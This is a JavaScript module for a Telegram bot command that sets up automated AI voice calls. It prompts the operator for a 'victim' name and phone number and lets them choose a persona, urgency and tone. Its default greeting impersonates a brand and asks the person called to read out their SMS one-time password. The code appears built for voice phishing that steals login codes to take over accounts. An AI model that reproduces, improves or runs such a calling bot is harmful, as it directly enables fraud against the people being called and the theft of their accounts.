const axios = require('axios');
const config = require('../config');
const { getUser } = require('../db/db');
const {
  getBusinessOptions,
  findBusinessOption,
  MOOD_OPTIONS,
  URGENCY_OPTIONS,
  TECH_LEVEL_OPTIONS,
  askOptionWithButtons,
  getOptionLabel
} = require('../utils/persona');
const { extractScriptVariables } = require('../utils/scripts');
const {
  startOperation,
  ensureOperationActive,
  registerAbortController,
  OperationCancelledError,
  ensureFlow,
  safeReset,
  guardAgainstCommandInterrupt
} = require('../utils/sessionState');
async function notifyCallError(ctx, lines = []) {
  const body = Array.isArray(lines) ? lines : [lines];
  await ctx.reply(section('❌ Call Alert', body));
}
const { section, escapeMarkdown, tipLine, buildLine } = require('../utils/commandFormat');
const { sendMenu } = require('../utils/menuCleanup');

const scriptsApiBase = config.scriptsApiUrl.replace(/\/+$/, '');
const DEFAULT_FIRST_MESSAGE = 'Hello! This is an automated call. How can I help you today?';

function isValidPhoneNumber(number) {
  const e164Regex = /^\+[1-9]\d{1,14}$/;
  return e164Regex.test((number || '').trim());
}

function replacePlaceholders(text = '', values = {}) {
  let output = text;
  for (const [token, value] of Object.entries(values)) {
    const pattern = new RegExp(`{${token}}`, 'g');
    output = output.replace(pattern, value);
  }
  return output;
}

function sanitizeVictimName(rawName) {
  if (!rawName) {
    return null;
  }
  const cleaned = rawName.replace(/[^a-zA-Z0-9\\s'\\-]/g, '').trim();
  return cleaned || null;
}

function buildPersonalizedFirstMessage(baseMessage, victimName, personaLabel) {
  if (!victimName) {
    return baseMessage;
  }
  const greeting = `Hello ${victimName}!`;
  const trimmedBase = (baseMessage || '').trim();
  if (!trimmedBase) {
    const brandLabel = personaLabel || 'our team';
    return `${greeting} Welcome to ${brandLabel}! For your security, we'll complete a quick verification to help protect your account from online fraud. If you've received your 6-digit one-time password by SMS, please enter it now.`;
  }
  const withoutExistingGreeting = trimmedBase.replace(/^hello[^.!?]*[.!?]?\\s*/i, '').trim();
  const remainder = withoutExistingGreeting.length ? withoutExistingGreeting : trimmedBase;
  return `${greeting} ${remainder}`;
}

async function safeScriptsRequest(method, url, options = {}) {
  try {
    const response = await axios.request({
      method,
      url: `${scriptsApiBase}${url}`,
      timeout: 15000,
      ...options
    });

    const contentType = response.headers?.['content-type'] || '';
    if (!contentType.includes('application/json')) {
      throw new Error('Scripts API returned non-JSON response');
    }
    if (response.data?.success === false) {
      throw new Error(response.data.error || 'Scripts API reported failure');
    }
    return response.data;
  } catch (error) {
    const base = `Ensure the scripts service is reachable at ${scriptsApiBase} or update SCRIPTS_API_URL.`;
    if (error.response) {
      const status = error.response.status;
      const contentType = error.response.headers?.['content-type'] || '';
      if (!contentType.includes('application/json')) {
        throw new Error(`Scripts API responded with HTTP ${status}. ${base}`);
      }
      const detail = error.response.data?.error || error.response.data?.message || `HTTP ${status}`;
      throw new Error(`${detail}. ${base}`);
    }
    if (error.request) {
      throw new Error(`No response from Scripts API. ${base}`);
    }
    throw new Error(`${error.message}. ${base}`);
  }
}

async function collectPlaceholderValues(conversation, ctx, placeholders, ensureActive) {
  const values = {};
  for (const placeholder of placeholders) {
    await ctx.reply(`✏️ Enter value for *${placeholder}* (type skip to leave unchanged):`, { parse_mode: 'Markdown' });
    const update = await conversation.wait();
    ensureActive();
    const text = update?.message?.text?.trim();
    if (text) {
      await guardAgainstCommandInterrupt(ctx, text);
    }
    if (!text || text.toLowerCase() === 'skip') {
      continue;
    }
    values[placeholder] = text;
  }
  return values;
}

async function fetchCallScripts() {
  const data = await safeScriptsRequest('get', '/api/call-scripts');
  return data.scripts || [];
}

async function fetchCallScriptById(id) {
  const data = await safeScriptsRequest('get', `/api/call-scripts/${id}`);
  return data.script;
}

async function selectCallScript(conversation, ctx, ensureActive) {
  let scripts;
  try {
    scripts = await fetchCallScripts();
    ensureActive();
  } catch (error) {
    await ctx.reply(error.message || '❌ Failed to load call scripts.');
    return null;
  }

  if (!scripts.length) {
    await ctx.reply('ℹ️ No call scripts available. Use /scripts to create one.');
    return null;
  }

  const options = scripts.map((script) => ({ id: script.id.toString(), label: `📄 ${script.name}` }));
  options.push({ id: 'back', label: '⬅️ Back' });

  const selection = await askOptionWithButtons(
    conversation,
    ctx,
    '📚 *Call Scripts*\nChoose a script to use for this call.',
    options,
    { prefix: 'call-script', columns: 1 }
  );
  ensureActive();

  if (selection.id === 'back') {
    return null;
  }

  const scriptId = Number(selection.id);
  if (Number.isNaN(scriptId)) {
    await ctx.reply('❌ Invalid script selection.');
    return null;
  }

  let script;
  try {
    script = await fetchCallScriptById(scriptId);
    ensureActive();
  } catch (error) {
    await ctx.reply(error.message || '❌ Failed to load script.');
    return null;
  }

  if (!script) {
    await ctx.reply('❌ Script not found.');
    return null;
  }

  if (!script.first_message) {
    await ctx.reply('⚠️ This script does not define a first message. Please edit it before using.');
    return null;
  }

  const placeholderSet = new Set();
  extractScriptVariables(script.prompt || '').forEach((token) => placeholderSet.add(token));
  extractScriptVariables(script.first_message || '').forEach((token) => placeholderSet.add(token));

  const placeholderValues = {};
  if (placeholderSet.size > 0) {
    await ctx.reply('🧩 This script contains placeholders. Provide values where applicable (type skip to leave as-is).');
    Object.assign(placeholderValues, await collectPlaceholderValues(conversation, ctx, Array.from(placeholderSet), ensureActive));
  }

  const filledPrompt = script.prompt ? replacePlaceholders(script.prompt, placeholderValues) : undefined;
  const filledFirstMessage = replacePlaceholders(script.first_message, placeholderValues);

  const payloadUpdates = {
    channel: 'voice',
    business_id: script.business_id || config.defaultBusinessId,
    prompt: filledPrompt,
    first_message: filledFirstMessage,
    voice_model: script.voice_model || config.defaultVoiceModel,
    script: script.name,
    script_id: script.id
  };

  const summary = [`Script: ${script.name}`];
  if (script.description) {
    summary.push(`Description: ${script.description}`);
  }

  const businessOption = script.business_id ? findBusinessOption(script.business_id) : null;
  if (businessOption) {
    summary.push(`Persona: ${businessOption.label}`);
  } else if (script.business_id) {
    summary.push(`Persona: ${script.business_id}`);
  }

  if (!payloadUpdates.purpose && businessOption?.defaultPurpose) {
    payloadUpdates.purpose = businessOption.defaultPurpose;
  }

  const personaConfig = script.persona_config || {};
  if (personaConfig.purpose) {
    summary.push(`Purpose: ${personaConfig.purpose}`);
    payloadUpdates.purpose = personaConfig.purpose;
  }
  if (personaConfig.emotion) {
    summary.push(`Tone: ${personaConfig.emotion}`);
    payloadUpdates.emotion = personaConfig.emotion;
  }
  if (personaConfig.urgency) {
    summary.push(`Urgency: ${personaConfig.urgency}`);
    payloadUpdates.urgency = personaConfig.urgency;
  }
  if (personaConfig.technical_level) {
    summary.push(`Technical level: ${personaConfig.technical_level}`);
    payloadUpdates.technical_level = personaConfig.technical_level;
  }

  if (Object.keys(placeholderValues).length > 0) {
    summary.push(`Variables: ${Object.entries(placeholderValues).map(([k, v]) => `${k}=${v}`).join(', ')}`);
  }

  if (!payloadUpdates.purpose) {
    payloadUpdates.purpose = config.defaultPurpose;
  }

  return {
    payloadUpdates,
    summary,
    meta: {
      scriptName: script.name,
      scriptDescription: script.description || 'No description provided',
      personaLabel: businessOption?.label || script.business_id || 'Custom'
    }
  };
}

async function buildCustomCallConfig(conversation, ctx, ensureActive, businessOptions) {
  const personaOptions = Array.isArray(businessOptions) && businessOptions.length ? businessOptions : await getBusinessOptions();
  const selectedBusiness = await askOptionWithButtons(
    conversation,
    ctx,
    '🎭 *Select service type / persona:*\nTap the option that best matches this call.',
    personaOptions,
    {
      prefix: 'persona',
      columns: 2,
      formatLabel: (option) => (option.custom ? '✍️ Custom Prompt' : option.label)
    }
  );
  ensureActive();

  if (!selectedBusiness) {
    await ctx.reply('❌ Invalid persona selection. Please try again.');
    return null;
  }

  const resolvedBusinessId = selectedBusiness.id || config.defaultBusinessId;
  const payloadUpdates = {
    channel: 'voice',
    business_id: resolvedBusinessId,
    voice_model: config.defaultVoiceModel,
    script: selectedBusiness.custom ? 'custom' : resolvedBusinessId,
    purpose: selectedBusiness.defaultPurpose || config.defaultPurpose
  };
  const summary = [];

  if (selectedBusiness.custom) {
    await ctx.reply('✍️ Enter the agent prompt (describe how the AI should behave):');
    const promptMsg = await conversation.wait();
    ensureActive();
    const prompt = promptMsg?.message?.text?.trim();
    if (prompt) {
      await guardAgainstCommandInterrupt(ctx, prompt);
    }
    if (!prompt) {
      await ctx.reply('❌ Please provide a valid prompt.');
      return null;
    }

    await ctx.reply('💬 Enter the first message the agent will say:');
    const firstMsg = await conversation.wait();
    ensureActive();
    const firstMessage = firstMsg?.message?.text?.trim();
    if (firstMessage) {
      await guardAgainstCommandInterrupt(ctx, firstMessage);
    }
    if (!firstMessage) {
      await ctx.reply('❌ Please provide a valid first message.');
      return null;
    }

    payloadUpdates.prompt = prompt;
    payloadUpdates.first_message = firstMessage;
    summary.push('Persona: Custom prompt');
    summary.push(`Prompt: ${prompt.substring(0, 120)}${prompt.length > 120 ? '...' : ''}`);
    summary.push(`First message: ${firstMessage.substring(0, 120)}${firstMessage.length > 120 ? '...' : ''}`);
    payloadUpdates.purpose = 'custom';
  } else {
    const availablePurposes = selectedBusiness.purposes || [];
    let selectedPurpose = availablePurposes.find((p) => p.id === selectedBusiness.defaultPurpose) || availablePurposes[0];

    if (availablePurposes.length > 1) {
      selectedPurpose = await askOptionWithButtons(
        conversation,
        ctx,
        '🎯 *Select call purpose:*\nChoose the specific workflow for this call.',
        availablePurposes,
        {
          prefix: 'purpose',
          columns: 1,
          formatLabel: (option) => `${option.emoji || '•'} ${option.label}`
        }
      );
      ensureActive();
    }

    selectedPurpose = selectedPurpose || availablePurposes[0];
    if (selectedPurpose?.id && selectedPurpose.id !== 'general') {
      payloadUpdates.purpose = selectedPurpose.id;
    }

    const recommendedEmotion = selectedPurpose?.defaultEmotion || 'neutral';
    const moodSelection = await askOptionWithButtons(
      conversation,
      ctx,
      `🎙️ *Tone preference*\nRecommended: *${recommendedEmotion}*.`,
      MOOD_OPTIONS,
      { prefix: 'tone', columns: 2 }
    );
    ensureActive();
    if (moodSelection.id !== 'auto') {
      payloadUpdates.emotion = moodSelection.id;
    }

    const recommendedUrgency = selectedPurpose?.defaultUrgency || 'normal';
    const urgencySelection = await askOptionWithButtons(
      conversation,
      ctx,
      `⏱️ *Urgency level*\nRecommended: *${recommendedUrgency}*.`,
      URGENCY_OPTIONS,
      { prefix: 'urgency', columns: 2 }
    );
    ensureActive();
    if (urgencySelection.id !== 'auto') {
      payloadUpdates.urgency = urgencySelection.id;
    }

    const techSelection = await askOptionWithButtons(
      conversation,
      ctx,
      '🧠 *Caller technical level*\nHow comfortable is the caller with technical details?',
      TECH_LEVEL_OPTIONS,
      { prefix: 'tech', columns: 2 }
    );
    ensureActive();
    if (techSelection.id !== 'auto') {
      payloadUpdates.technical_level = techSelection.id;
    }

    summary.push(`Persona: ${selectedBusiness.label}`);
    if (selectedPurpose?.label) {
      summary.push(`Purpose: ${selectedPurpose.label}`);
    }

    const toneSummary = moodSelection.id === 'auto'
      ? `${moodSelection.label} (${getOptionLabel(MOOD_OPTIONS, recommendedEmotion)})`
      : moodSelection.label;
    const urgencySummary = urgencySelection.id === 'auto'
      ? `${urgencySelection.label} (${getOptionLabel(URGENCY_OPTIONS, recommendedUrgency)})`
      : urgencySelection.label;
    const techSummary = techSelection.id === 'auto'
      ? getOptionLabel(TECH_LEVEL_OPTIONS, 'general')
      : techSelection.label;

    summary.push(`Tone: ${toneSummary}`);
    summary.push(`Urgency: ${urgencySummary}`);
    summary.push(`Technical level: ${techSummary}`);
  }

  return {
    payloadUpdates,
    summary,
    meta: {
      scriptName: personaOptions?.label || 'Custom',
      scriptDescription: 'Custom persona configuration',
      personaLabel: personaOptions?.label || 'Custom'
    }
  };
}

async function callFlow(conversation, ctx) {
  const opId = startOperation(ctx, 'call');
  const flow = ensureFlow(ctx, 'call', { step: 'start' });
  const ensureActive = () => ensureOperationActive(ctx, opId);

  const waitForMessage = async () => {
    const update = await conversation.wait();
    ensureActive();
    const text = update?.message?.text?.trim();
    if (text) {
      await guardAgainstCommandInterrupt(ctx, text);
    }
    return update;
  };

  try {
    await ctx.reply('Starting call process…');
    const user = await new Promise((resolve) => getUser(ctx.from.id, resolve));
    ensureActive();
    if (!user) {
      await ctx.reply('❌ You are not authorized to use this bot.');
      return;
    }
    flow.touch('authorized');

    const businessOptions = await getBusinessOptions();
    ensureActive();
    flow.touch('business-options');

    const prefill = ctx.session.meta?.prefill || {};
    let number = prefill.phoneNumber || null;
    let victimName = prefill.victimName || null;

    if (number) {
      await ctx.reply(`📞 Using follow-up number: ${number}`);
      if (ctx.session.meta) {
        delete ctx.session.meta.prefill;
      }
      flow.touch('number-prefilled');
    } else {
      await ctx.reply('📞 Enter phone number (E.164 format):');
      const numMsg = await waitForMessage();
      number = numMsg?.message?.text?.trim();

      if (!number) {
        await ctx.reply('❌ Please provide a phone number.');
        return;
      }

      if (!isValidPhoneNumber(number)) {
        await ctx.reply('❌ Invalid phone number format. Use E.164 format: +16125151442');
        return;
      }
      flow.touch('number-captured');
    }

    if (victimName) {
      await ctx.reply(`👤 Using victim name: ${victimName}`);
    } else {
      await ctx.reply('👤 Please enter the victim\'s name (as it should be spoken on the call):\nType skip to leave blank.');
      const nameMsg = await waitForMessage();
      const providedName = nameMsg?.message?.text?.trim();
      if (providedName && providedName.toLowerCase() !== 'skip') {
        const sanitized = sanitizeVictimName(providedName);
        if (sanitized) {
          victimName = sanitized;
          flow.touch('victim-name');
        }
      }
    }

    const configurationMode = await askOptionWithButtons(
      conversation,
      ctx,
      '⚙️ How would you like to configure this call?',
      [
        { id: 'script', label: '📁 Use call script' },
        { id: 'custom', label: '🛠️ Build custom persona' }
      ],
      { prefix: 'call-config', columns: 1 }
    );
    ensureActive();

    let configuration = null;
    if (configurationMode.id === 'script') {
      configuration = await selectCallScript(conversation, ctx, ensureActive);
      if (!configuration) {
        await ctx.reply('ℹ️ No script selected. Switching to custom persona builder.');
      }
    }
    flow.touch('mode-selected');

    if (!configuration) {
      configuration = await buildCustomCallConfig(conversation, ctx, ensureActive, businessOptions);
    }

    if (!configuration) {
      await ctx.reply('❌ Call setup cancelled.');
      return;
    }
    flow.touch('configuration-ready');

    const payload = {
      number,
      user_chat_id: ctx.from.id.toString(),
      customer_name: victimName || null,
      ...configuration.payloadUpdates
    };

    payload.business_id = payload.business_id || config.defaultBusinessId;
    payload.purpose = payload.purpose || config.defaultPurpose;
    payload.voice_model = payload.voice_model || config.defaultVoiceModel;
    payload.script = payload.script || 'custom';
    payload.technical_level = payload.technical_level || 'auto';

    const scriptName =
      configuration.meta?.scriptName ||
      configuration.payloadUpdates?.script ||
      'Custom';
    const scriptDescription =
      configuration.meta?.scriptDescription ||
      configuration.payloadUpdates?.script_description ||
      'No description provided';
    const personaLabel =
      configuration.meta?.personaLabel ||
      configuration.payloadUpdates?.persona_label ||
      'Custom';

    if (!payload.first_message) {
      payload.first_message = DEFAULT_FIRST_MESSAGE;
    }
    payload.first_message = buildPersonalizedFirstMessage(
      payload.first_message,
      victimName,
      personaLabel
    );

    const toneValue = payload.emotion || 'auto';
    const urgencyValue = payload.urgency || 'auto';
    const techValue = payload.technical_level || 'auto';
    const hasAutoFields = [toneValue, urgencyValue, techValue].some((value) => value === 'auto');

    const detailLines = [
      buildLine('📋', 'To', number),
      victimName ? buildLine('👤', 'Victim', escapeMarkdown(victimName)) : null,
      buildLine('🧩', 'Script', escapeMarkdown(scriptName)),
      payload.purpose ? buildLine('🎯', 'Purpose', escapeMarkdown(payload.purpose)) : null
    ].filter(Boolean);

    if (toneValue !== 'auto') {
      detailLines.push(buildLine('🎙️', 'Tone', toneValue));
    }
    if (urgencyValue !== 'auto') {
      detailLines.push(buildLine('⏱️', 'Urgency', urgencyValue));
    }
    if (techValue !== 'auto') {
      detailLines.push(buildLine('🧠', 'Technical level', techValue));
    }
    if (hasAutoFields) {
      detailLines.push(tipLine('⚙️', 'Mode: Auto'));
    }

    const replyOptions = { parse_mode: 'Markdown' };
    if (hasAutoFields) {
      const detailsKey = `${Date.now().toString(36)}${Math.random().toString(36).slice(2, 8)}`;
      if (!ctx.session.callDetailsCache) {
        ctx.session.callDetailsCache = {};
      }
      if (!ctx.session.callDetailsKeys) {
        ctx.session.callDetailsKeys = [];
      }
      ctx.session.callDetailsCache[detailsKey] = [
        'ℹ️ Call Details:',
        `• Tone: ${toneValue}`,
        `• Urgency: ${urgencyValue}`,
        `• Technical level: ${techValue}`
      ].join('\n');
      ctx.session.callDetailsKeys.push(detailsKey);
      if (ctx.session.callDetailsKeys.length > 10) {
        const oldestKey = ctx.session.callDetailsKeys.shift();
        if (oldestKey) {
          delete ctx.session.callDetailsCache[oldestKey];
        }
      }
      replyOptions.reply_markup = {
        inline_keyboard: [[{ text: 'ℹ️ Details', callback_data: `CALL_DETAILS:${detailsKey}` }]]
      };
    }

    await sendMenu(ctx, section('🔍 Call Brief', detailLines), replyOptions);
    await ctx.reply('⏳ Making the call…');

    const payloadForLog = { ...payload };
    if (payloadForLog.prompt) {
      payloadForLog.prompt = `${payloadForLog.prompt.substring(0, 50)}${payloadForLog.prompt.length > 50 ? '...' : ''}`;
    }

    console.log('Sending payload to API:', payloadForLog);

    const controller = new AbortController();
    const release = registerAbortController(ctx, controller);
    let response;
    try {
      response = await axios.post(`${config.apiUrl}/outbound-call`, payload, {
        headers: {
          'Content-Type': 'application/json'
        },
        timeout: 30000,
        signal: controller.signal
      });
      ensureActive();
    } finally {
      release();
    }

    const data = response?.data;
    if (data?.success && data.call_sid) {
      flow.touch('completed');
    } else {
      await ctx.reply('⚠️ Call was sent but response format unexpected. Check logs.');
    }
  } catch (error) {
    if (error instanceof OperationCancelledError || error?.name === 'AbortError' || error?.name === 'CanceledError') {
      console.log('Call flow cancelled');
      return;
    }

    console.error('Call error details:', {
      message: error.message,
      status: error.response?.status,
      statusText: error.response?.statusText,
      data: error.response?.data,
      config: {
        url: error.config?.url,
        method: error.config?.method,
        headers: error.config?.headers
      }
    });

    let handled = false;
    if (error.response) {
      const status = error.response.status;
      const apiError = (error.response.data?.error || '').toString();
      const unknownBusinessMatch = apiError.match(/Unknown business_id "([^"]+)"/i);
      if (unknownBusinessMatch) {
        const invalidId = unknownBusinessMatch[1];
        await notifyCallError(ctx, `${tipLine('🧩', `Unrecognized service “${escapeMarkdown(invalidId)}”. Choose a valid profile.`)}`);
        handled = true;
      } else if (status === 400) {
        await notifyCallError(ctx, 'Invalid request. Check the provided details and try again.');
        handled = true;
      } else if (status === 401) {
        await notifyCallError(ctx, 'Authentication failed. Please verify your API credentials.');
        handled = true;
      } else if (status === 503) {
        await notifyCallError(ctx, 'Service unavailable. Please try again shortly.');
        handled = true;
      }

      if (!handled) {
        const errorData = error.response.data;
        await notifyCallError(ctx, `${tipLine('🔍', `Call failed with status ${status}: ${escapeMarkdown(errorData?.error || error.response.statusText)}`)}`);
        handled = true;
      }
    } else if (error.request) {
      await notifyCallError(ctx, 'Temporary network issue. Retrying shortly.');
      handled = true;
    } else {
      await notifyCallError(ctx, `Unexpected error: ${escapeMarkdown(error.message)}`);
      handled = true;
    }

    await safeReset(ctx, 'call_flow_error', {
      message: '⚠️ Setup interrupted — restarting call setup...',
      menuHint: '📋 Use /call to try again or /menu for other actions.'
    });
  }
}

function registerCallCommand(bot) {
  bot.command('call', async (ctx) => {
    try {
      console.log(`Call command started by user ${ctx.from?.id || 'unknown'}`);
      const user = await new Promise((resolve) => getUser(ctx.from.id, resolve));
      if (!user) {
        return ctx.reply('❌ You are not authorized to use this bot.');
      }
      await ctx.conversation.enter('call-conversation');
    } catch (error) {
      console.error('Error starting call conversation:', error);
      await ctx.reply('❌ Could not start call process. Please try again.');
    }
  });
}

module.exports = {
  callFlow,
  registerCallCommand
};
